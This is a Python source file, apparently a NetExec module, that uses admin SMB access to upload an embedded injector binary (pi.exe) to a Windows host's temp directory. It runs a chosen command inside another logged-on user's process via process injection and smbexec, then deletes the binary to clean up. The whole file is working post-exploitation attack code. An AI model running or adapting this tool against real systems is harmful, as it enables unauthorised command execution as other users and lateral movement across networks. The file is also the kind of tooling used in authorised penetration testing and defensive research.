from base64 import b64decode
from sys import exit
from os.path import abspath, join, isfile

from nxc.paths import DATA_PATH, TMP_PATH


class NXCModule:
    name = "pi"
    description = "Run command as logged on users via Process Injection"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        r"""
        PID       // Process ID for Target User, PID=pid
        EXEC      // Command to exec, EXEC='command'  Single quote is better to use

        This module reads the executed command output under the name C:\windows\temp\output.txt and deletes it. In case of a possible error, it may need to be deleted manually.
        """
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.share = "C$"
        self.tmp_share = self.tmp_dir.split(":")[1]
        self.pi = "pi.exe"
        self.useembeded = True
        self.pid = self.cmd = ""
        with open(join(DATA_PATH, ("pi_module/pi.bs64"))) as pi_file:
            self.pi_embedded = b64decode(pi_file.read())

        if "EXEC" in module_options:
            self.cmd = module_options["EXEC"]

        if "PID" in module_options:
            self.pid = module_options["PID"]

    def on_admin_login(self, context, connection):
        if self.useembeded:
            file_to_upload = abspath(join(TMP_PATH, "pi.exe"))
            with open(file_to_upload, "wb") as pm:
                pm.write(self.pi_embedded)
        else:
            if isfile(self.imp_exe):
                file_to_upload = self.imp_exe
            else:
                context.log.error(f"Cannot open {self.imp_exe}")
                exit(1)

        try:
            if self.cmd == "" or self.pid == "":
                self.uploadfile = False
                context.log.highlight("Firstly run tasklist.exe /v to find process id for each user")
                context.log.highlight("Usage: -o PID=pid EXEC='Command'")
                return
            else:
                self.uploadfile = True
                context.log.display(f"Uploading {self.pi}")
                with open(file_to_upload, "rb") as pi:
                    try:
                        connection.conn.putFile(self.share, f"{self.tmp_share}{self.pi}", pi.read)
                        context.log.success("pi.exe successfully uploaded")

                    except Exception as e:
                        context.log.fail(f"Error writing file to share {self.tmp_share}: {e}")
                        return

                context.log.display(f"Executing {self.cmd}")
                command = f'{self.tmp_dir}pi.exe {self.pid} "{self.cmd}"'
                for line in connection.execute(command, True, methods=["smbexec"]).splitlines():
                    context.log.highlight(line)

        except Exception as e:
            context.log.fail(f"Error running command: {e}")
        finally:
            try:
                if self.uploadfile is True:
                    connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.pi}")
                    context.log.success("pi.exe successfully deleted")
            except Exception as e:
                context.log.fail(f"Error deleting pi.exe on {self.share}: {e}")
